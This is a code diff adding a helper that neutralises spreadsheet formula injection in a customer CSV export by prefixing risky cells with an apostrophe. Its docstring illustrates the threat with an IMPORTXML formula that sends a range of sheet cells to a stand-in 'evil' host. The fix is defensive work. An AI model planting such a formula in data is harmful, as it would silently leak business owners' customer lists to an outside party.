@@ -358,6 +358,36 @@ CSV_COLUMNS = (
 )
 
 
+# Spreadsheet applications evaluate a cell whose content starts with one of
+# these, and quoting does not prevent it: QUOTE_ALL is a CSV *transport*
+# concern, and Excel/Sheets/LibreOffice strip the quotes on import before
+# parsing the content.
+_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_safe(value: str) -> str:
+    """Neutralize spreadsheet formula injection in an exported text cell.
+
+    Customer names and emails are not ours: they arrive verbatim from the
+    Stripe and Square customer records (integrations/stripe_adapter.py reads
+    ``obj["name"]``, which the *end customer* types at checkout), so a gym
+    member can choose to be called
+    ``=IMPORTXML("https://evil/?d="&CONCATENATE(A1:A500),"//a")``. Google
+    Sheets evaluates that on import with no warning dialog, which would
+    exfiltrate the owner's whole customer list the moment they open their
+    export.
+
+    The leading apostrophe is the standard mitigation and renders as a literal
+    in every major spreadsheet. Applied only when the first character is
+    actually risky, so ordinary values round-trip unchanged and the file can
+    still be re-imported by the CSV adapter.
+    """
+    cleaned = value.replace("\r", " ").replace("\n", " ")
+    if cleaned[:1] in _FORMULA_PREFIXES:
+        return "'" + cleaned
+    return cleaned
+
+
 def to_csv_rows(scored: list[ScoredCustomer]) -> list[list[str]]:
     """Scored customers as CSV cells, header first.
 
@@ -373,12 +403,12 @@ def to_csv_rows(scored: list[ScoredCustomer]) -> list[list[str]]:
         rows.append(
             [
                 s.customer.external_id or "",
-                name,
-                s.customer.email or "",
-                s.customer.phone or "",
+                _csv_safe(name),
+                _csv_safe(s.customer.email or ""),
+                _csv_safe(s.customer.phone or ""),
                 str(s.result.score),
                 s.result.band,
-                " | ".join(s.result.reasons),
+                _csv_safe(" | ".join(s.result.reasons)),
                 "" if s.days_since_last_visit is None else str(s.days_since_last_visit),
                 str(s.visit_count),
                 f"{s.total_spend:.2f}",
